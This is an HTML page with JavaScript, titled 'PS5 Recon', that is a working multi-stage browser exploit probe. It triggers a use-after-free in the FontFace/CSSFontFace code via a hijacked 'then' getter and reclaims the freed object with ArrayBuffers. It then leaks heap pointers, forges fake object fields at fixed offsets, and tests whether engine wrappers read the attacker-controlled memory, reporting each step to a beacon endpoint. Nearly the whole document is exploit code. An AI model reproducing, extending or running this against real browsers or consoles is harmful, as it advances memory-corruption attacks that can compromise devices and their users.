<!DOCTYPE html>
<html lang="en"><head><meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<meta http-equiv="Cache-Control" content="no-cache,no-store,must-revalidate">
<title>PS5 Recon</title>
<style>
:root{--bg:#070a0f;--panel:#111722;--line:#1e2838;--txt:#cfe0f2;--dim:#6b7c94;--green:#39d98a;--red:#ff5d6c;--amber:#ffcf6b;--cyan:#53d0e8;--mag:#ff6fd0}
*{margin:0;padding:0;box-sizing:border-box}
html,body{background:var(--bg);color:var(--txt);font:13px/1.5 ui-monospace,Menlo,Consolas,monospace}
#bn{position:fixed;top:0;left:0;right:0;z-index:99;font:800 17px/1.3 ui-monospace,monospace;padding:15px 12px;text-align:center;color:#fff;background:#1b2330;border-bottom:3px solid #2a3647}
#sub{position:fixed;top:68px;left:0;right:0;z-index:98;font:600 11px ui-monospace,monospace;padding:6px 12px;text-align:center;color:var(--dim);background:#0d131c;border-bottom:1px solid var(--line)}
#log{margin:100px 10px 10px;padding:10px;background:var(--panel);border:1px solid var(--line);border-radius:8px;max-height:74vh;overflow:auto}
.r{padding:2px 5px;white-space:pre-wrap;word-break:break-all;border-left:3px solid transparent}
.r .t{color:var(--cyan);font-weight:700}.r .n{color:var(--dim);font-weight:700}
.r.ok{border-left-color:var(--green);background:#0c1f16}.r.ok .t{color:var(--green)}
.r.bad{border-left-color:var(--red);background:#1c0f12}.r.bad .t{color:var(--red)}
.r.warn .t{color:var(--amber)}
.r.win{border-left-color:var(--mag);background:#1e0f1b}.r.win .t{color:var(--mag);font-weight:800}
</style></head>
<body>
<div id="bn">starting…</div>
<div id="sub">P1312 — reclaim CSSFontFace → FORCE a JS wrapper → does reading it go THROUGH our buffer?</div>
<div id="log"></div>
<script>
'use strict';
window.PTAG='P1312';
var LOG=document.getElementById('log'),BN=document.getElementById('bn');
var _ctr=0;
function S(x,c){BN.textContent=x;BN.style.background=c||'#1b2330';}
function cls(s){var z=(''+s).toLowerCase();
  if(/win|through|readback-ok|differs|controlled/.test(z))return 'win';
  if(/hit|resolved|accepted|wrapper-ok|ok\b/.test(z))return 'ok';
  if(/err|fail|reject|crash|fatal|clean|nomap|timeout|no-wrap|nohit/.test(z))return 'bad';
  if(/miss|retry|stale|none/.test(z))return 'warn';return '';}
function row(t,d,c){_ctr++;var r=document.createElement('div');r.className='r '+(c||'');
  r.innerHTML="<span class='n'>"+_ctr+"</span>  <span class='t'>"+String(t).replace(/[<>&]/g,'')+"</span>"+(d?"  <span>"+String(d).replace(/[<>&]/g,'')+"</span>":"");
  LOG.appendChild(r);LOG.scrollTop=LOG.scrollHeight;}
/* sync XHR beacon OUTSIDE getter (P1216 proven pattern) + persistent on-page row */
function B(tag,data){
  var c=cls(tag+' '+(data||''));row(tag,data,c);
  try{var s=String(data||'').replace(/[^A-Za-z0-9._-]/g,'_').slice(0,700);
    var u='/beacon.php?tag=P1312-'+encodeURIComponent(tag);
    if(data)u+='&data='+encodeURIComponent(s);
    u+='&t='+Date.now();
    var x=new XMLHttpRequest();x.open('GET',u,false);x.send(null);}catch(e){}
}
window.onerror=function(m,s,l){B('ERR',(''+m).slice(0,80)+'@'+l);};

/* ── version / boot beacon ── */
(function(){var id='';var cs='ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';for(var i=0;i<6;i++)id+=cs[Math.floor(Math.random()*cs.length)];B('VER-1','');B('BOOT',id);})();

var K=8, SIZE=192;
var styleEl=null, firedHere=false;
var leaked={p58:null,p68:null};

function hx(v){return ('0'+v.toString(16)).slice(-2);}
function hexq(arr){if(!arr)return 'null';var s='0x';for(var i=7;i>=0;i--)s+=hx(arr[i]);return s;}
function grab(view,off){var a=[];for(var i=0;i<8;i++)a.push(view[off+i]);return a;}
function setq(view,off,arr){for(var i=0;i<8;i++)view[off+i]=arr[i];}

/* reload cap: fresh open clears sessionStorage → fresh attempt w/ fresh memory */
var RC=0;try{RC=parseInt(sessionStorage.getItem('p1312_rc')||'0',10)||0;}catch(e){}
function reloadOnce(){
  if(RC>=3){B('NOLEAK-CAP','3 reloads this open — CLOSE+REOPEN for fresh memory');S('no leak x3 — close+reopen browser for a fresh try','#4a2a12');return;}
  try{sessionStorage.setItem('p1312_rc',String(RC+1));}catch(e){}
  setTimeout(function(){location.reload();},500);
}

function setupFace(name,cssName,range){
  styleEl=document.createElement('style');
  styleEl.textContent="@font-face { font-family: "+cssName+"; src: local(Arial); unicode-range: "+range+"; }";
  document.head.appendChild(styleEl);
  var A=new FontFace(name,'local(Helvetica)',{unicodeRange:'U+0041'});
  document.fonts.add(A);
  void A.loaded;
  if(!window.__alive)window.__alive=[];
  window.__alive.push(A);
}
function installGetter(fill){
  firedHere=false;
  Object.defineProperty(FontFace.prototype,'then',{configurable:true,
    get:function(){
      if(firedHere)return undefined;firedHere=true;
      if(styleEl)styleEl.remove();
      try{document.fonts.delete(this);}catch(e){}
      styleEl=null;document.body.offsetHeight;
      window.__map=[];
      for(var k=0;k<K;k++){
        var ab=new ArrayBuffer(SIZE);var v=new Uint8Array(ab);
        if(fill&&leaked.p58){
          setq(v,0x00,[0x01,0,0,0,0,0,0,0]); /* refcount=1 */
          setq(v,0x58,leaked.p58);           /* m_clients */
          setq(v,0x68,leaked.p68);           /* m_wrapper */
        }
        window.__map.push({ab:ab,view:v});
      }
      try{document.fonts.check('1em s0');}catch(e){}
      return undefined;
    },set:function(){}});
}
function scanHit(){
  var m=window.__map;if(!m||!m.length)return false;
  var best=-1,nz=0;
  for(var i=0;i<m.length;i++){var v=m[i].view,n=0;for(var j=0;j<v.length;j++)if(v[j]!==0)n++;if(n>nz){nz=n;best=i;}}
  if(best<0)return false;
  var v=m[best].view;leaked.p58=grab(v,0x58);leaked.p68=grab(v,0x68);return true;
}

/* ═══ STAGE 1: leak ═══ */
S('STAGE 1 — reclaim + leak heap ptrs…','#13233a');
B('S1-SETUP','');
window.__alive=[];
setupFace('f0','s0','U+0042');
installGetter(false);
document.fonts.load('1em f0, s0','AB').then(function(){B('S1-RESOLVED','');},function(){B('S1-REJECTED','');});
setTimeout(function(){
  if(scanHit()){B('S1-HIT','p58='+hexq(leaked.p58)+' p68='+hexq(leaked.p68));S('STAGE 1 HIT — leak ok','#0c7a3a');setTimeout(runStage2,180);}
  else B('S1-CLEAN60','');
},60);
setTimeout(function(){
  if(leaked.p58)return;
  if(scanHit()){B('S1-HIT2','p58='+hexq(leaked.p58)+' p68='+hexq(leaked.p68));S('STAGE 1 HIT (400ms) — leak ok','#0c7a3a');setTimeout(runStage2,180);}
  else {B('S1-CLEAN400','');}
},400);
setTimeout(function(){if(leaked.p58)return;B('S1-TIMEOUT','fired='+firedHere);S('no leak this open — reloading…','#4a2a12');reloadOnce();},2000);

/* ═══ STAGE 2: refill reclaimed slot so engine trusts it as a CSSFontFace ═══ */
function runStage2(){
  S('STAGE 2 — template (engine trust)…','#13233a');
  B('S2-SETUP','');
  setupFace('f1','s1','U+0043');
  installGetter(true);
  document.fonts.load('1em f1, s1','AB').then(function(){
    B('S2-RESOLVED','accepted');S('TEMPLATE ACCEPTED — forcing wrapper…','#0c7a3a');
    setTimeout(runStage3,250);
  },function(){B('S2-REJECTED','');S('template rejected — reloading…','#4a2a12');reloadOnce();});
  setTimeout(function(){ /* if resolve never fires, still try stage3 */
    if(window.__s3done)return;B('S2-NORESOLVE','trying stage3 anyway');setTimeout(runStage3,50);
  },1200);
}

/* ═══ STAGE 3: FORCE a JS wrapper over the reclaimed face; does reading it hit OUR buffer? ═══ */
function dumpSetFaces(label){
  var faces=[];
  try{document.fonts.forEach(function(f){
    var fam='?',st='?',wt='?',ur='?';
    try{fam=''+f.family;}catch(e){fam='E';}
    try{st=''+f.status;}catch(e){st='E';}
    try{wt=''+f.weight;}catch(e){wt='E';}
    try{ur=(''+f.unicodeRange).slice(0,24);}catch(e){ur='E';}
    faces.push(fam+'/'+st+'/'+wt+'/'+ur);
  });}catch(e){B(label+'-FOREACH-ERR',(''+e).slice(0,50));}
  B(label,'n='+faces.length+'|'+faces.join(' , ').slice(0,600));
  return faces;
}
function runStage3(){
  if(window.__s3done)return;window.__s3done=true;
  S('STAGE 3 — force wrapper + readback test','#13233a');
  B('S3-START','');

  /* 3A: current faces in the set (baseline) */
  var before=dumpSetFaces('S3-SET-BEFORE');

  /* 3B: forge a DISTINCT family marker + an odd status into the reclaimed buffer,
     then re-run every JS path that could create/return a wrapper reading our bytes.
     Family descriptor (m_family RefPtr<CSSValue>) sits BEFORE m_clients(+0x58):
     candidate ptr offsets 0x10..0x30. We DON'T have a valid fake CSSValue, so a
     family read may throw/garble — that THROW/GARBLE itself proves the wrapper reads
     our buffer. Status (uint8) sits AFTER m_wrapper(+0x68): candidates 0x70..0x90. */
  var m=window.__map;
  var tv=null;
  if(m)for(var i=0;i<m.length;i++){var v=m[i].view;if(v[0]===1&&v[0x58]===leaked.p58[0]){tv=v;break;}}
  if(!tv&&m&&m.length)tv=m[0].view;
  if(!tv){B('S3-NOBUF','no template buffer');finish();return;}

  /* write a recognizable status byte=4 (Failure) across candidate status offsets one at a time
     is destructive; instead write a single sentinel status=4 at the most-likely 0x70 and dump */
  var statusOffsets=[0x70,0x78,0x80,0x88,0x90,0x98];
  var readbacks=[];
  for(var si=0;si<statusOffsets.length;si++){
    var off=statusOffsets[si];var orig=tv[off];
    tv[off]=4; /* Failure */
    var snap=dumpSetFaces('S3-ST-0x'+off.toString(16));
    /* did any face report status 4 (Failure) that wasn't there before? */
    var foundFail=false;for(var r=0;r<snap.length;r++){if(/\/4\//.test('/'+snap[r].split('/')[1]+'/'))foundFail=true;}
    for(var r2=0;r2<snap.length;r2++){var p=snap[r2].split('/');if(p[1]==='4')foundFail=true;}
    if(foundFail){B('S3-STATUS-READBACK','WIN off=0x'+off.toString(16)+' — wrapper read OUR status byte!');readbacks.push(off);}
    tv[off]=orig;
  }

  /* 3C: try to FORCE wrapper creation via FontFaceSet load/check on our family names */
  var probes=['1em s1','1em f1','1em s0','1em f0'];
  for(var pi=0;pi<probes.length;pi++){(function(q){
    try{var c=document.fonts.check(q);B('S3-CHK','q="'+q+'" -> '+c);}catch(e){B('S3-CHK-ERR','q="'+q+'" '+(''+e).slice(0,40));}
  })(probes[pi]);}

  /* 3D: iterate via values()/entries() (different code path than forEach) */
  try{
    var vals=[];var it=document.fonts.values();var step=it.next();var guard=0;
    while(!step.done&&guard<40){var f=step.value;var fam='?';try{fam=''+f.family;}catch(e){fam='FAM-THREW';}
      var st='?';try{st=''+f.status;}catch(e){st='ST-THREW';}vals.push(fam+'/'+st);step=it.next();guard++;}
    B('S3-VALUES','n='+vals.length+'|'+vals.join(' , ').slice(0,500));
    for(var vi=0;vi<vals.length;vi++){if(/THREW/.test(vals[vi])){B('S3-GETTER-THREW','WIN — a wrapper getter threw reading our buffer: '+vals[vi]);}}
  }catch(e){B('S3-VALUES-ERR',(''+e).slice(0,50));}

  /* 3E: final re-load to coax a wrapper that reads descriptors */
  try{document.fonts.load('1em f1','ABC').then(function(){B('S3-RELOAD','resolved');var af=dumpSetFaces('S3-SET-AFTER');finish();},
    function(e){B('S3-RELOAD-REJ',(''+(e&&e.name)).slice(0,30));finish();});}
  catch(e){finish();}
  setTimeout(function(){if(!window.__fin)finish();},1400);
}
function finish(){
  if(window.__fin)return;window.__fin=true;
  B('DONE','p1312');
  S('P1312 COMPLETE — press the run button, I\'ll aggregate','#1b2330');
}
</script>
</body></html>
